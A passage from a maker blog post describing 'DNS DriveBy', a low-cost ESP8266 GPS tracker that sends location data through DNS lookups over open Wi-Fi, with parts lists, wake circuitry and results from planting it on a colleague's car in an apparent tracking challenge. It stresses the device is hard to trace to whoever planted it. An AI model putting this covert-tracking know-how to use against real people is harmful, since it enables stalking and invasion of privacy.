</code></pre><p>Usually, we &ldquo;wake&rdquo; the board up in software <a href=https://randomnerdtutorials.com/esp8266-deep-sleep-with-arduino-ide/>by specifying a delay</a>, but since I wanted to trigger a reset when motion is detected from a shake sensor, this was tricky since the onboard I/O pins are disabled in deep sleep mode.</p><p>Triggering the reset when Irish&rsquo;s car starts up was as simple as adding a shake sensor between <code>reset</code> and <code>ground</code> - but in order to prevent an accidental reset while the device is powered up, I had to use an <a href=https://www.electronics-tutorials.ws/transistor/tran_2.html>NPN transistor</a> and a NOT gate to create a rudimentary <a href=https://plashlights.com/blogs/news/normally-open-vs-closed-switch>normally-closed switch</a>, which electronically &ldquo;disconnects&rdquo; the shake sensor while the tracker is powered up & moving.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_5d23d0e072da28c72371a87996437127.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_6bd9c7d745c8e3819eb7af642f8d6512.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_ee7f71b185f66aeec7ec86a17fac9cd9.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_21a0ad0628af11cad6bc41b5ea2e266b.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_3dfe5b756aa50c6df1b8b669f1912a19.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_1920x0_resize_q75_h2_box.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/reset-circuit_hucc416e083c3c59b403d125ab80a6bbba_365147_1920x0_resize_q75_h2_box.webp alt="DNS DriveBy reset circuitry and schematic" width=1920 height=1080></p><table><thead><tr><th>Reset Circuitry</th><th>Notes</th><th>Qty</th><th>Cost</th></tr></thead><tbody><tr><td><a href=https://www.aliexpress.us/item/3256803953142444.html>Shake Sensor</a></td><td>Wakes up ESP8266 from Deep Sleep when motion is detected</td><td>1</td><td>5¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/3256803576929395.html>NPN Transistor</a></td><td>Used to control reset circuit, use 2N3904 or similar</td><td>3</td><td>3¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/2251832839624931.html>10K Ω Resistor</a></td><td>Something about circuits</td><td>3</td><td>2¢</td></tr></tbody></table><div class="alert alert-doks d-flex" role=alert><div class="flex-shrink-1 alert-icon">⚠️</div><div class=w-100>Reset circuitry and battery components aren&rsquo;t necessary to run the basic PoC.</div></div><h4 id=final-prototype>Final Prototype <a href=#final-prototype class=anchor aria-hidden=true></a></h4><p>To piece it all together, I soldered all my components on a perfboard, and implemented a cheap BMS using a voltage regulator & an 400mAh LiPo battery that gives me around 4.5 hours of continuous reconnaissance (at a current draw ~90mAh).</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/perfboard_huf44b6bd2c8ac7b95c80b8f9a80cccea8_764229_b14792b4297137e6f191f6cbe9d135fd.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/perfboard_huf44b6bd2c8ac7b95c80b8f9a80cccea8_764229_5cf64e992b7533414e6691574b619396.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/perfboard_huf44b6bd2c8ac7b95c80b8f9a80cccea8_764229_190dbb602d177e9e44bbf48d6d3dfd38.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/perfboard_huf44b6bd2c8ac7b95c80b8f9a80cccea8_764229_1241x0_resize_q75_h2_box_3.webp 1241w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/perfboard_huf44b6bd2c8ac7b95c80b8f9a80cccea8_764229_1241x0_resize_q75_h2_box_3.webp alt="DNS DriveBy perfboard prototype" width=1241 height=698></p><table><thead><tr><th>Battery Management</th><th>Notes</th><th>Qty</th><th>Cost</th></tr></thead><tbody><tr><td><a href=https://www.aliexpress.us/item/3256803232619846.html>3.7V LiPo Battery</a></td><td>I use a 400mAh battery with a max size <code>16x35x8mm</code> to fit in the enclosure</td><td>1</td><td>$2.5</td></tr><tr><td><a href=https://www.aliexpress.us/item/2255799856317474.html>Slide Switch (SPDT)</a></td><td>Turn the tracker on/off</td><td>1</td><td>4¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/2255800949347304.html>Perfboard</a></td><td>Hell you could just connect everything with 22AWG wire</td><td>1</td><td>2¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/3256804481581777.html>Terminal Block</a></td><td>Screw-down connector for the LiPo battery</td><td>1</td><td>6¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/2251832796106924.html>ESP-01 Female Pin Headers</a></td><td>ESP-01 standoff to give more space for mounting components</td><td>1</td><td>5¢</td></tr></tbody></table><p>To protect the electronics & provide a large enough surface to adhere to Irish&rsquo;s car, I used FreeCAD to whip up a minimal 2-part enclosure that uses heat inserts & screws cause I thought they were cool.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_5e0d05d11403294f794dc8728de20014.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_71c719f6166161f457f712fed381b1c4.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_63c415a360fdc776af8e7885e2216f72.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_277b750d52b1a37fbb9172914e8152f7.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_23921803004703b777d572ee84fb8b78.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_7c53eb61efa2842cfdfc3835774073ce.webp 2048w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_4864x0_resize_q75_h2_box.webp 4864w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/assembly_hu01be3ef8ea44df3c309914942b0ca215_3436795_4864x0_resize_q75_h2_box.webp alt="Assembled DNS DriveBy prototype with ESP8266 and NEO-6M GPS" width=4864 height=2736></p><table><thead><tr><th>Case Assembly</th><th>Notes</th><th>Qty</th><th>Cost</th></tr></thead><tbody><tr><td><a href=https://www.aliexpress.us/item/2255800399618554.html>M2.5 x 6mm Threaded Inserts</a></td><td>You don&rsquo;t need threaded inserts but they&rsquo;re nice</td><td>4</td><td>4¢</td></tr><tr><td><a href=https://www.aliexpress.us/item/2251832624557792.html>M2.5 x 6mm Screws</a></td><td></td><td>4</td><td>6¢</td></tr></tbody></table><h2 id=tracking-experiment-results>Tracking Experiment Results <a href=#tracking-experiment-results class=anchor aria-hidden=true></a></h2><p>To test out the prototype, I enabled an open Wi-Fi network on my phone and drove around to see if I could get a consistent log of GPS coordinates along my route. Since it&rsquo;s designed to cache data while no open networks are available, I turned off the hotspot at random intervals to see if I could still receive those coordinates.</p><p>I initially faced some issues with the <a href=https://techtutorialsx.com/2017/01/21/esp8266-watchdog-functions/>watchdog timer</a> triggering while it attempted to scan for open networks, and heap overflows while multitasking between GPS logging & running Wi-Fi scans - but eventually got a pretty robust prototype working!</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_50671ccf52e5ff8012a207ac8f2ca286.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_ad0018e4432d82ad673066b016520165.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_a0635b5d681b5a1ec76cae1f2f5975f3.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_5002718c6c42753ae557402e1f59393a.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_7103749a981489accb5ae2cbc0775a6d.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_1920x0_resize_q75_h2_box_3.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/exfil-gps_hu046ae36d5d7b8838e1ce1376fe264320_1812824_1920x0_resize_q75_h2_box_3.webp alt="GPS Data Exfiltrated to CanaryTokens Dashboard" width=1920 height=1080></p><p>The next day, Kody, Michael, and I deployed our tracking systems on Irish, each using a different approach and reconnaissance style:</p><ul><li>Michael used off-the shelf trackers and consumer products such as a <a href=https://www.tile.com>Tile tracker</a></li><li>Kody used out-of-the-box hacker hardware and a tricky QR code phishing attack to track Irish using Wi-Fi probes from his phone</li><li>I used my skills as a hardware developer to create a low-cost, virtually untracable implant to give me passive location updates</li></ul><p>At the end of the day, I checked my CanaryTokens dashboard and had a couple hundred hits from Irish&rsquo;s excursion around East LA!</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/irish-map_hu0526db4d69a9f2d254c7164d005bd004_494124_f12a27be56c3485c46c635be6d8b98d4.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/irish-map_hu0526db4d69a9f2d254c7164d005bd004_494124_49f514b41e637610577e2da009fc3383.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/irish-map_hu0526db4d69a9f2d254c7164d005bd004_494124_1057x0_resize_q75_h2_box_3.webp 1057w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/irish-map_hu0526db4d69a9f2d254c7164d005bd004_494124_1057x0_resize_q75_h2_box_3.webp alt="Map of Irish&amp;rsquo;s Route around Glendale with GPS Points" width=1057 height=595></p><p>In order to turn this data into something useful, I downloaded the CanaryTokens log as a <code>csv</code> file, used Python to parse the GPS coordinates, and used <a href=https://mymaps.google.com>Google MyMaps</a> to visualize the data.</p><p>Since the tracker was planted on Irish&rsquo;s car, this map only provides insight to the general areas that he visited - but I was still able to see that he stopped at Forest Lawn, and took a visit to the Glendale Galleria!</p><h2 id=implications--future-improvements>Implications & Future Improvements <a href=#implications--future-improvements class=anchor aria-hidden=true></a></h2><h4 id=limitations>Limitations <a href=#limitations class=anchor aria-hidden=true></a></h4><p>While DNS DriveBy doesn&rsquo;t provide real-time GPS updates like an off-the-shelf solution would, my prototype was able to gather equally insightful data on the places Irish visited, in a much cheaper and less traceable footprint - since a SIM card or GPS Tracker UID could potentially be used to determine who planted it.</p><p>The trade-off of course is relying on the presence of open Wi-Fi networks to provide telemetry, and the infrequent, intermittent updates - but given that the target (or wardriving neighborhood cat) is traversing somewhat urban areas, the density of open Wi-Fi networks should be modest. If they&rsquo;re frequenting certain locations, it&rsquo;s also possible to hard-code known credentials for specific home/work networks as well!</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_a62a87639019d2a7e1517312537524df.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_24ecb8fbc717a050e7cd1d68ed12824d.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_5250b79da95fe6a48c1cde95fe4516e0.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_07e9f78ecd80799366cb6fc12e4e8c2b.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_1bd57d0bd69f2d3645deccb50ead7d8e.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_1614x0_resize_q75_h2_box_3.webp 1614w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/tracker-on-car_hue5e9b1b9a8685541dd529c268ee7499c_993087_1614x0_resize_q75_h2_box_3.webp alt="DNS DriveBy tracker planted in car bumper" width=1614 height=908></p><h4 id=improvements>Improvements <a href=#improvements class=anchor aria-hidden=true></a></h4><p>To make the design more robust and easier for beginners to assemble, I started designing a PCB kit that includes all the project components, which can also be used try out some of my other low-cost Signals Intelligence projects!</p><p>Using the <a href=https://www.wemos.cc/en/latest/d1/d1_mini.html>D1 Mini</a> ESP8266 form-factor, this design allows for easy plug-and-play expansion with various <a href=https://www.wemos.cc/en/latest/d1_mini_shield/index.html>D1 hardware add-ons</a>, and also has a larger 4MB flash chip.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_f45a6edfc91d1031baac026554724e7f.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_3e89a37062623b5600c89759936240f0.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_71fafa4b732d0073cffc4ac3a8205aaf.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_cbcb5747ddb0f3cc59a4fed454d500b0.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_1377x0_resize_q75_h2_box_3.webp 1377w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/PCB_hu40d07d5e74ae43a6fa736a7f40b99057_430036_1377x0_resize_q75_h2_box_3.webp alt="DNS DriveBy PCB Render" width=1377 height=775></p><h4 id=conclusion--future-ideas>Conclusion & Future Ideas <a href=#conclusion--future-ideas class=anchor aria-hidden=true></a></h4><p>After successfully plotting Irish&rsquo;s full trip with precise datetime and GPS data through intermittent updates, I successfully demonstrated the feasibility of fortuitous reconnaissance over open Wi-Fi networks! Using tricky techniques like DNS exfiltration, I was able to bypass captive portals, and also used a $1 Wi-Fi microcontroller to create a low-profile tracker that provides GPS telemetry to an online dashboard.</p><p>While I didn&rsquo;t get to explore the original &ldquo;lazy wardriving&rdquo; concept in this demo, DNS DriveBy lays the groundwork for a cheap, easy-to-replicate reconnaissance platform & exfiltration technique that I&rsquo;ll definitely embed in my future projects.</p><p>Through <a href=https://www.iotforall.com/what-is-assisted-gps>assisted GPS</a>, I hope to push how far I can take this tracker in my next iteration, by using <strong>only</strong> a Wi-Fi radio (no GPS) and online database like <a href=https://www.wigle.net/>WiGLE</a> to reverse the tracker&rsquo;s location based off known Wi-Fi networks.</p><p>If you want to follow updates on this project and more, check out my <a href=https://twitter.com/AlexLynd>Twitter</a> and consider <a href=https://www.buymeacoffee.com/alexlynd>donating</a> to support my work!</p><h4 id=sponsor>Sponsor <a href=#sponsor class=anchor aria-hidden=true></a></h4><p>This project wouldn&rsquo;t be possible without my sponsor <a href=https://pcbway.com>PCBWay</a>! Check out their website for PCB fabrication and other prototyping solutions.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_d2defc62d1d664a77c3516caef980eb7.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_941351516f4360542d9808c86137cb92.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_6206758245a3dd4879ff2061b32fb861.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_d72e9014b0baf82ff75f0fd58057686f.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_42343de24deec210f008c0fba3ba3eb2.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_1920x0_resize_q75_h2_box_3.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/pcbway_hu02bc75a5af9cb4e460a96675ba89bede_52732_1920x0_resize_q75_h2_box_3.webp width=1920 height=600></p></div></div></article></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>© 2022 Alex Lynd / LyndLabs</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline><li class=list-inline-item><a href=/about/#contact-me>Contact Me</a></li></ul></div></div></div></footer><script src=/js/bootstrap.min.54bf0932b8a36d0e152b1635b099a6ef1394d35327e2437550a075c9c8ed1bd8aed5847c21b36fc02ed24014c031d9ca24017b0c78b1639d7e2fa8329898b842.js integrity="sha512-VL8JMrijbQ4VKxY1sJmm7xOU01Mn4kN1UKB1ycjtG9iu1YR8IbNvwC7SQBTAMdnKJAF7DHixY51+L6gymJi4Qg==" crossorigin=anonymous defer></script>
<script src=/js/highlight.min.56a414730f1135fe77b5ea30bf74a2cc4101a6f386e85e5b789c800570cc33d33054000f45932c053a59b41018f72687867254a80e1b9710671852492533162f.js integrity="sha512-VqQUcw8RNf53teowv3SizEEBpvOG6F5beJyABXDMM9MwVAAPRZMsBTpZtBAY9yaHhnJUqA4blxBnGFJJJTMWLw==" crossorigin=anonymous defer></script>
<script src=/main.min.162c56a0426544de0d010e66c56e321579655c400c9aae06a6823e7682de379adadf2165bd416fea191e4e7e410fbf1fd2c35a759aa43ff2e3787067669bf81b.js integrity="sha512-FixWoEJlRN4NAQ5mxW4yFXllXEAMmq4GpoI+doLeN5ra3yFlvUFv6hkeTn5BD78f0sNadZqkP/LjeHBnZpv4Gw==" crossorigin=anonymous defer></script>
<script src=/index.min.771f2e9655d5cf51ac648506c3b4967af53322731eaab2224a29c664e5c3075bc26161f50dcdcd2b752770e9cd919c9db9f60f7807453745012c158ee4382730.js integrity="sha512-dx8ullXVz1GsZIUGw7SWevUzInMeqrIiSinGZOXDB1vCYWH1Dc3NK3UncOnNkZydufYPeAdFN0UBLBWO5DgnMA==" crossorigin=anonymous defer></script></body></html>